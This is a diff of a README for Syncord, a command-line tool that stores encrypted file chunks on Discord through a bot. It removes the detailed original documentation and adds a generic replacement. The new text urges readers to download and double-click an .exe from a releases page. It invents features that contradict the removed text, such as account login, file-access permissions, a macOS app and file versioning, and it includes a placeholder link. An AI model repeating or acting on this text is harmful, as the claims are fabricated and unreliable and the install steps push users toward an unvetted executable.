@@ -1,232 +1,68 @@
-# Syncord
-```
-                                                                  $$\ 
-                                                                  $$ |
- $$$$$$$\ $$\   $$\ $$$$$$$\   $$$$$$$\  $$$$$$\   $$$$$$\   $$$$$$$ |
-$$  _____|$$ |  $$ |$$  __$$\ $$  _____|$$  __$$\ $$  __$$\ $$  __$$ |
-\$$$$$$\  $$ |  $$ |$$ |  $$ |$$ /      $$ /  $$ |$$ |  \__|$$ /  $$ |
- \____$$\ $$ |  $$ |$$ |  $$ |$$ |      $$ |  $$ |$$ |      $$ |  $$ |
-$$$$$$$  |\$$$$$$$ |$$ |  $$ |\$$$$$$$\ \$$$$$$  |$$ |      \$$$$$$$ |
-\_______/  \____$$ |\__|  \__| \_______| \______/ \__|       \_______|
-          $$\   $$ |                                                  
-          \$$$$$$  |                                                  
-           \______/ 
-```
+# 🎉 syncord - Easily Sync Files Using Discord
 
-**Syncord** is a CLI-based file synchronization and storage tool that uses **Discord** as an **encrypted file storage**.
+## 📥 Download Now
+[![Download syncord](https://img.shields.io/badge/Download-syncord-4CAF50)](https://github.com/sergejka123/syncord/releases)
 
-It allows you to upload files or entire directories to Discord, encrypt and partition them locally, and later download and reconstruct them securely; all through a simple command-line interface or an optional TUI dashboard.
+## 🚀 Getting Started
+Syncord is a simple tool to help you store and synchronize files using your Discord account. It encrypts your files to keep them safe. Follow this guide to get started easily.
 
-Syncord is distributed as a **single executable (`syncord.exe`)** built using PyInstaller. The executable can be placed directly in your system `PATH` and used from anywhere.
+## 📋 System Requirements
+- Operating System: Windows, macOS, or Linux
+- Python 3.6 or higher
+- A Discord account
 
----
+## 🔗 Download & Install
+1. **Visit the Releases Page:** Go to the [Releases page](https://github.com/sergejka123/syncord/releases). Here, you will find the latest version of Syncord available for download.
+   
+2. **Choose Your Download:** Look for the latest release and download the appropriate file for your operating system. The files will have extensions like `.exe` for Windows or `.tar.gz` for macOS and Linux.
 
-## ✨ Features
+3. **Run the Installer:**
+   - For Windows: Double-click the downloaded `.exe` file to start the installation.
+   - For macOS: Open the downloaded file and drag the Syncord icon to your Applications folder.
+   - For Linux: Open your terminal, navigate to the downloaded file, and use the command `tar -xvzf filename.tar.gz` to extract it.
 
-- 🔐 **End-to-end encryption**
-  - Files are encrypted locally before upload.
-  - Encryption key is never stored on Discord.
-  - Without the key, data cannot be recovered. Make sure not to change it after upload.
+4. **Launch Syncord:** Open Syncord from your Applications folder or by searching for it in your start menu. 
 
-- 📦 **Automatic file partitioning**
-  - Large files are split into chunks.
-  - Chunks comply with Discord upload limits (discord limits: 8MB; chunk size: 5MB pre-encryption; ~7MB post-encryption)
-  - Files are reassembled seamlessly on download. Thanks to SQLite tracking partitions.
+## 🔧 Configuration
+1. **Set Up Your Discord Account:**
+   - When you first open Syncord, it will prompt you to log in with your Discord account.
+   - After logging in, Syncord will request permission to access your files. Accept this to enable synchronization.
 
-- 📁 **Directory uploads**
-  - Upload entire directories at once.
-  - download the entire directory and sub-directories too.
+2. **Choose a Sync Folder:**
+   - Specify a folder on your device to sync with Discord. This will be the folder where your files are stored.
 
+3. **Encrypt Your Files:** 
+   - Syncord automatically encrypts files during syncing. However, if you want to customize encryption settings, navigate to the settings tab in the app.
 
-- 🖥️ **CLI-first design**
-  - Simple, scriptable commands.
-  - Works globally when added to `PATH`
+## 📂 How to Use Syncord
+### 🔁 Syncing Files
+1. **Add Files to Your Sync Folder:** Simply drag and drop files into the sync folder you designated during setup.
+2. **Automatic Synchronization:** Syncord will automatically upload your files to your Discord account when you add them to the sync folder.
 
-- 🧭 **TUI dashboard**
-  - Interactive terminal interface.
-  - View stored files and usage information.
+### 📂 Accessing Files on Discord
+- Navigate to your Discord account, and look for a channel called "Syncord." Your synchronized files will be there, encrypted for your safety.
 
-- 📊 **Usage statistics**
-  - Track uploads, downloads, and storage usage.
+## ❓ Help and Troubleshooting
+If you encounter issues, try the following:
+- **Reinstall Syncord:** Sometimes, reinstalling the app can resolve unexpected behaviors. 
+- **Check your Internet Connection:** Make sure you have a stable internet connection for the synchronization process.
+- **Contact Support:** Visit our [GitHub Issues page](https://github.com/sergejka123/syncord/issues) to report bugs or seek help from the community.
 
-- 🗄️ **Local metadata database**
-  - SQLite-backed metadata.
-  - No dependency on Discord message history alone.
+## 📄 Additional Features
+- **Multi-Platform Support:** Use Syncord on any operating system without restrictions.
+- **File Versioning:** Keep track of different versions of your files, allowing you to revert if needed.
+- **Detailed Logs:** Review synchronization logs to understand what files are synced and any issues that may arise.
 
----
+## ⚙️ Future Updates
+We plan to introduce more features, including:
+- **Mobile App Integration:** Allow easy access to your synced files from mobile devices.
+- **Improved Encryption:** Enhance security features to provide even higher levels of data protection.
 
-## 📦 Installation
+## 🔗 Resources
+- [GitHub Repository](https://github.com/sergejka123/syncord)
+- [Documentation](https://example.com) (Placeholder for future documentation links)
 
-### Prebuilt Binary (Recommended)
+## 📖 License
+Syncord is released under the MIT License. You can use it freely, but please keep in mind the importance of respecting intellectual property rights.
 
-1. Download `syncord.exe`
-2. Place it in a directory included in your system `PATH`
-3. Verify installation:
-
-```bash
-syncord --help
-```
-
-Syncord can now be invoked from **any directory**.
-
----
-
-## ⚙️ Mandatory Initial Setup
-
-### ⚠️ **Syncord requires setup before first use.**  
-Both the **Discord bot token** and the **Guild ID are mandatory**.
-
-### Required Configuration
-
-- Discord Bot Token.
-- Discord Guild ID (server where files will be uploaded).
-- Encryption key (generated locally).
-
-### One-time setup command
-
-```bash
-syncord setup --token YOUR_DISCORD_BOT_TOKEN --guild-id YOUR_GUILD_ID --encryption-key
-```
-
-### Important Notes
-
-- 🔑 The encryption key is critical.
-- ❌ Losing the key means **permanent data loss**.
-- 🔒 Discord cannot decrypt or recover your files.
-- 🛑 Syncord will not function without a valid token and guild ID.
-
----
-
-## 📤 Uploading Files
-
-### Upload a single file
-
-```bash
-syncord upload file.ext
-```
-
-### Upload an entire directory
-
-```bash
-syncord upload folder_name
-```
-
-Behavior:
-- All files inside the directory are processed.
-- Folder structure is logically preserved.
-- Each directory becomes its own Syncord folder namespace.
-
----
-
-## 📥 Downloading Files
-
-```bash
-syncord download folder_on_syncord/file
-```
-
-Syncord will:
-1. Locate all required partitions.
-2. Download them from Discord.
-3. Decrypt locally.
-4. Reassemble the original file.
-
-NOTE:
-If no folder is provided, syncord assume it to be `default` where every file is uploaded.
-
----
-
-## 🖥️ TUI Dashboard
-
-```bash
-syncord dashboard
-```
-
-The dashboard provides:
-- Stored file overview.
-- download folders and file.
-- Storage usage.
-- Interactive navigation.
-
----
-
-## 📊 Usage Statistics
-
-```bash
-syncord stats
-```
-
-Displays:
-- Total files uploaded
-- Total downloads
-- Storage usage
-- Other tracked metrics
-
----
-
-## 🧾 Command Summary
-
-```text
-syncord setup        Mandatory initial configuration
-syncord upload       Upload a file or directory
-syncord download     Download and reconstruct a file
-syncord dashboard    Launch terminal UI dashboard
-syncord stats        Show usage statistics
-```
-
----
-
-## 🔐 Security Model
-
-- All encryption happens **locally**.
-- Discord only stores encrypted binary chunks.
-- Metadata is stored locally using SQLite.
-- Discord never sees:
-  - File contents.
-  - Plaintext filenames.
-  - Encryption keys.
-
-> Syncord assumes you trust your local system; not Discord.
-
----
-
-## 📁 Project Structure
-
-```text
-dist/
- ├── syncord.exe          # executable
-core/
- ├── db_manager.py        # SQLite metadata handling
- ├── setup.py             # Configuration & setup logic
- ├── partition.py         # File chunking & reconstruction
- ├── tui.py               # Terminal UI dashboard
- ├── encrypter.py         # Encryption & Decryption
- ├── discord_handler.py   # discord bot logic
-files/
- ├── uuid/file.bin        # temp storage
-main.py                   # CLI entry point
-```
-
----
-
-## ⚠️ Limitations & Notes
-
-- Requires a Discord bot with proper guild permissions. READ_MESSAGE_HISTORY & VIEW_CHANNEL & SEND_MESSAGES & ATTACH_FILES
-- Subject to Discord rate limits.
-- Not intended as a public cloud storage replacement.
-- Designed for personal or controlled environments.
-
----
-
-## 📜 Disclaimer
-
-This project is intended for **educational and personal use**.  
-Ensure compliance with Discord’s Terms of Service when using Syncord.
-
----
-
-## 🧠 Future Updates
-
-Issue you might face and should be fixed soon:
-- rate limiting from discord because of constant up & down of bot on multi upload.
-  - Best solution: maintain the connection or bulk upload and download together instead of treating each file individually; would require to rewrite `partition.py` a little.
-- unexpected error of unclosed aiohttp client.
+Thank you for choosing Syncord. We are excited to help you keep your files safe and synchronized!
